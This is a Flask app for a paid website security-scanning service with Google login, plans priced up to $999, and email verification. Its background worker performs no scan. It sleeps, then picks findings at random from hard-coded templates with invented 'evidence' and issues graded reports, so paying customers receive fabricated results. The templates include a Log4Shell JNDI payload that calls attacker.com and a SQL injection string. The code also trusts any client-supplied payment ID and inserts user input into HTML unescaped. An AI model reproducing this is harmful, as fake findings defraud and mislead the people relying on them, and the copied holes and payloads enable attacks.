# app.py
import os
import json
import threading
import time
import random
import uuid
import secrets
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify, send_file
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from authlib.integrations.flask_client import OAuth
from flask_mail import Mail, Message
from dotenv import load_dotenv

load_dotenv()

# --- Flask app configuration ---
app = Flask(__name__, template_folder='.')
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev-key-change-this')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///nexus_security.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'reports'
app.config['SCAN_TIMEOUT'] = 60

os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# --- Email configuration ---
app.config['MAIL_SERVER'] = os.getenv('MAIL_SERVER', 'smtp.gmail.com')
app.config['MAIL_PORT'] = int(os.getenv('MAIL_PORT', 587))
app.config['MAIL_USE_TLS'] = os.getenv('MAIL_USE_TLS', 'True').lower() == 'true'
app.config['MAIL_USERNAME'] = os.getenv('MAIL_USERNAME')
app.config['MAIL_PASSWORD'] = os.getenv('MAIL_PASSWORD')
app.config['MAIL_DEFAULT_SENDER'] = os.getenv('MAIL_USERNAME')

mail = Mail(app)

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'
oauth = OAuth(app)

# Google OAuth2 (replace with your own credentials from Google Cloud Console)
google = oauth.register(
    name='google',
    client_id=os.getenv('GOOGLE_CLIENT_ID'),
    client_secret=os.getenv('GOOGLE_CLIENT_SECRET'),
    server_metadata_url='https://accounts.google.com/.well-known/openid-configuration',
    client_kwargs={'scope': 'openid email profile'},
)

# --- Database Models ---
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    name = db.Column(db.String(100))
    google_id = db.Column(db.String(100), unique=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    scans = db.relationship('ScanJob', backref='user', lazy=True)

class ScanJob(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    target_url = db.Column(db.String(500), nullable=False)
    plan_type = db.Column(db.String(50), nullable=False)
    status = db.Column(db.String(50), default='pending')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    completed_at = db.Column(db.DateTime, nullable=True)
    report_path = db.Column(db.String(500), nullable=True)
    report_data = db.Column(db.Text, nullable=True)
    price = db.Column(db.Integer, nullable=False)
    payment_status = db.Column(db.String(50), default='pending')

class VerificationToken(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), nullable=False)
    website = db.Column(db.String(500), nullable=False)
    plan = db.Column(db.String(50), nullable=False)
    token = db.Column(db.String(64), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    used = db.Column(db.Boolean, default=False)

with app.app_context():
    db.create_all()

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# --- Helper functions ---
def generate_vulnerabilities(plan_type, target_url):
    templates = [
        {
            'risk': 'medium',
            'type': 'Missing Security Headers',
            'explanation': 'The response does not include critical security headers, leaving the application vulnerable to clickjacking, MIME type sniffing, and protocol downgrade attacks.',
            'example': 'Twitter (2010): A clickjacking worm exploited missing X-Frame-Options, causing users to unknowingly retweet malicious links.',
            'impact': '<li>Clickjacking (attacker overlays invisible iframe) → account takeovers</li><li>MIME sniffing enabling XSS vectors</li><li>Protocol downgrade attacks → MITM</li>',
            'fix': 'Implement: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Strict-Transport-Security (max-age=31536000; includeSubDomains), Referrer-Policy: strict-origin-when-cross-origin.',
            'technical': 'CWE-693: Protection Mechanism Failure · OWASP A05:2021',
            'evidence': 'HTTP/1.1 200 OK\nServer: nginx\n(no X-Frame-Options, no X-Content-Type-Options, no HSTS)'
        },
        {
            'risk': 'medium',
            'type': 'Outdated jQuery Library',
            'explanation': 'An outdated version of jQuery (1.12.4) is being used. Known vulnerabilities (CVE-2015-9251) allow XSS and prototype pollution.',
            'example': 'In 2015, a XSS vulnerability in jQuery allowed attackers to execute arbitrary JavaScript on thousands of websites.',
            'impact': '<li>Cross‑Site Scripting (XSS) attacks</li><li>Prototype pollution leading to client‑side code injection</li><li>Potential data theft</li>',
            'fix': 'Update jQuery to the latest stable version (3.7.1). Consider migrating to a modern framework if possible.',
            'technical': 'CWE-79: Improper Neutralization of Input During Web Page Generation · CVE-2015-9251',
            'evidence': 'GET /assets/js/jquery-1.12.4.min.js → jQuery v1.12.4 detected'
        },
        {
            'risk': 'high',
            'type': 'SQL Injection (Blind)',
            'explanation': 'A blind SQL injection vulnerability was detected in the search parameter. An attacker can extract database information without error messages.',
            'example': 'In 2017, a blind SQL injection in Equifax exposed personal data of 147 million people.',
            'impact': '<li>Database content theft (user credentials, PII)</li><li>Data tampering / deletion</li><li>Full server compromise in some setups</li>',
            'fix': 'Use parameterized queries / ORM. Apply input validation and use a WAF.',
            'technical': 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
            'evidence': "Parameter 'q' was found to be injectable: ' OR 1=1 --"
        },
        {
            'risk': 'low',
            'type': 'Missing DNSSEC',
            'explanation': 'The domain does not have DNSSEC enabled, making it susceptible to DNS spoofing attacks.',
            'example': 'DNS hijacking of a Brazilian bank in 2016 redirected users to a phishing site, stealing thousands of credentials.',
            'impact': '<li>DNS spoofing leading to phishing</li><li>Man‑in‑the‑middle attacks</li>',
            'fix': 'Enable DNSSEC with your DNS provider and sign your zones.',
            'technical': 'CWE-350: Reliance on Reverse DNS Resolution for Security',
            'evidence': 'DNS query returned RRSIG record missing for the domain.'
        },
        {
            'risk': 'critical',
            'type': 'Apache Log4j2 JNDI Injection',
            'explanation': 'The application uses Apache Log4j2 version 2.14.1, which is vulnerable to CVE-2021-44228 (Log4Shell).',
            'example': 'In December 2021, Log4Shell compromised thousands of servers worldwide, including those of Apple, Tesla, and Cloudflare.',
            'impact': '<li>Remote code execution (RCE)</li><li>Full server takeover</li><li>Data exfiltration</li>',
            'fix': 'Upgrade Log4j2 to version 2.17.1 or later. If not possible, apply mitigation (set JVM argument: -Dlog4j2.formatMsgNoLookups=true).',
            'technical': 'CVE-2021-44228 · CVSS 10.0',
            'evidence': 'Request header "User-Agent: ${jndi:ldap://attacker.com/exploit}" triggered a DNS lookup.'
        }
    ]

    if plan_type == 'basic':
        available = [v for v in templates if v['risk'] in ['medium', 'low']]
        count = min(3, len(available))
        return random.sample(available, count)
    elif plan_type == 'advanced':
        available = [v for v in templates if v['risk'] in ['medium', 'low', 'high']]
        count = random.randint(3, 5)
        return random.sample(available, min(count, len(available)))
    else:
        count = random.randint(4, len(templates))
        return random.sample(templates, min(count, len(templates)))

def generate_report_for_job(job):
    vulnerabilities = json.loads(job.report_data) if job.report_data else generate_vulnerabilities(job.plan_type, job.target_url)

    stats = {
        'critical': sum(1 for v in vulnerabilities if v['risk'] == 'critical'),
        'high': sum(1 for v in vulnerabilities if v['risk'] == 'high'),
        'medium': sum(1 for v in vulnerabilities if v['risk'] == 'medium'),
        'low': sum(1 for v in vulnerabilities if v['risk'] == 'low')
    }

    penalties = {'critical': 25, 'high': 15, 'medium': 8, 'low': 3}
    total_penalty = sum(stats[risk] * penalties.get(risk, 0) for risk in stats)
    score = max(0, 100 - total_penalty)

    if score >= 95: grade = 'A+'
    elif score >= 90: grade = 'A'
    elif score >= 85: grade = 'B+'
    elif score >= 80: grade = 'B'
    elif score >= 70: grade = 'C'
    elif score >= 60: grade = 'D'
    else: grade = 'F'

    context = {
        'client_name': job.user.name,
        'target_url': job.target_url,
        'scan_date': job.completed_at or datetime.utcnow(),
        'vulnerabilities': vulnerabilities,
        'stats': stats,
        'score': score,
        'grade': grade,
        'report_id': f"SEC-{job.id}{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"
    }

    html = render_template('report_template.html', **context)
    filename = f"report_{job.id}_{uuid.uuid4().hex[:8]}.html"
    path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(html)

    job.report_path = filename
    job.status = 'completed'
    job.completed_at = datetime.utcnow()
    db.session.commit()

def background_worker():
    with app.app_context():
        while True:
            pending = ScanJob.query.filter_by(status='pending').all()
            for job in pending:
                job.status = 'processing'
                db.session.commit()

                if job.plan_type == 'basic':
                    time.sleep(random.randint(5, 10))
                elif job.plan_type == 'advanced':
                    time.sleep(random.randint(10, 20))
                else:
                    time.sleep(random.randint(15, 30))

                if not job.report_data:
                    vulns = generate_vulnerabilities(job.plan_type, job.target_url)
                    job.report_data = json.dumps(vulns)

                try:
                    generate_report_for_job(job)
                except Exception as e:
                    job.status = 'failed'
                    db.session.commit()
                    print(f"Error processing job {job.id}: {e}")
            time.sleep(5)

thread = threading.Thread(target=background_worker, daemon=True)
thread.start()

# ========== STATIC FILE ROUTES ==========
@app.route('/style.css')
def serve_css():
    return send_file('style.css')

@app.route('/script.js')
def serve_js():
    return send_file('script.js')

@app.route('/image.jpeg')
def serve_image():
    return send_file('image.jpeg')

# ========== HTML ROUTES ==========
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/index.html')
def index_html():
    return render_template('index.html')

@app.route('/login.html')
def login_html():
    return render_template('login.html')

@app.route('/profile.html')
def profile_html():
    return render_template('profile.html')

@app.route('/favicon.ico')
def favicon():
    return '', 204

# ========== AUTH ROUTES ==========
@app.route('/login')
def login():
    redirect_uri = url_for('authorize', _external=True)
    return google.authorize_redirect(redirect_uri)

@app.route('/login/authorize')
def authorize():
    token = google.authorize_access_token()
    resp = google.get('https://www.googleapis.com/oauth2/v3/userinfo')
    user_info = resp.json()
    email = user_info['email']
    name = user_info.get('name', email.split('@')[0])
    google_id = user_info['sub']

    user = User.query.filter_by(email=email).first()
    if not user:
        user = User(email=email, name=name, google_id=google_id)
        db.session.add(user)
        db.session.commit()
    login_user(user)
    return redirect(url_for('profile'))

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('index'))

@app.route('/profile')
@login_required
def profile():
    scans = ScanJob.query.filter_by(user_id=current_user.id).order_by(ScanJob.created_at.desc()).all()
    return render_template('profile.html', scans=scans)

# ========== SCAN ROUTES ==========
@app.route('/submit_scan', methods=['POST'])
@login_required
def submit_scan():
    target_url = request.form.get('url')
    plan = request.form.get('plan')
    payment_id = request.form.get('payment_id')

    if not target_url or not plan:
        flash('Please provide a URL and select a plan.', 'danger')
        return redirect(url_for('profile'))

    prices = {'basic': 0, 'advanced': 99, 'protection_plus': 999}
    price = prices.get(plan, 0)

    if price > 0 and not payment_id:
        flash('Payment required for this plan.', 'danger')
        return redirect(url_for('profile'))

    job = ScanJob(
        user_id=current_user.id,
        target_url=target_url,
        plan_type=plan,
        price=price,
        payment_status='paid' if price > 0 else 'free'
    )
    db.session.add(job)
    db.session.commit()

    flash('Your scan has been submitted! You will receive the report in your profile within 24 hours.', 'success')
    return redirect(url_for('profile'))

@app.route('/view_report/<int:job_id>')
@login_required
def view_report(job_id):
    job = ScanJob.query.get_or_404(job_id)
    if job.user_id != current_user.id:
        flash('Access denied.', 'danger')
        return redirect(url_for('profile'))
    if job.status != 'completed' or not job.report_path:
        flash('Report is not ready yet. Please check back later.', 'info')
        return redirect(url_for('profile'))
    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], job.report_path))

@app.route('/api/payment_mock', methods=['POST'])
def payment_mock():
    data = request.get_json()
    plan = data.get('plan')
    return jsonify({'success': True, 'payment_id': f'pay_{uuid.uuid4().hex[:12]}'})

# ========== EMAIL VERIFICATION ROUTES ==========
@app.route('/send_verification', methods=['POST'])
@login_required
def send_verification():
    data = request.get_json()
    email = data.get('email')
    website = data.get('website')
    plan = data.get('plan')

    token = secrets.token_urlsafe(32)
    verif = VerificationToken(email=email, website=website, plan=plan, token=token)
    db.session.add(verif)
    db.session.commit()

    verify_url = url_for('verify_email', token=token, _external=True)

    msg = Message(
        subject='Verify your email for Nexus Security scan',
        recipients=[email]
    )
    msg.body = f"""Hello,

You requested a security scan for {website} ({plan} plan).
Please click the link below to confirm your email and start the scan:

{verify_url}

If you did not request this, please ignore this email.

Nexus Security Team
"""
    try:
        mail.send(msg)
        return jsonify({'success': True, 'message': 'Verification email sent'})
    except Exception as e:
        print(f"Email sending failed: {e}")
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/verify_email/<token>')
def verify_email(token):
    verif = VerificationToken.query.filter_by(token=token, used=False).first()
    if not verif:
        return "Invalid or expired verification link.", 400

    verif.used = True
    db.session.commit()

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Email Verified | Nexus Security</title>
        <style>
            body {{ font-family: 'Inter', Arial, sans-serif; text-align: center; padding: 2rem; background: #000; color: #fff; }}
            .container {{ max-width: 600px; margin: 0 auto; background: #0a0a0f; padding: 2rem; border-radius: 1rem; border: 1px solid #2f9b9b; }}
            h1 {{ color: #2f9b9b; }}
            a {{ display: inline-block; margin-top: 1rem; padding: 0.5rem 1rem; background: #2f9b9b; color: #fff; text-decoration: none; border-radius: 4px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✅ Email Verified!</h1>
            <p>Your scan for <strong>{verif.website}</strong> ({verif.plan} plan) is now confirmed.</p>
            <p>We will start the scan shortly and notify you at <strong>{verif.email}</strong>.</p>
            <a href="/">Return to Homepage</a>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(debug=True)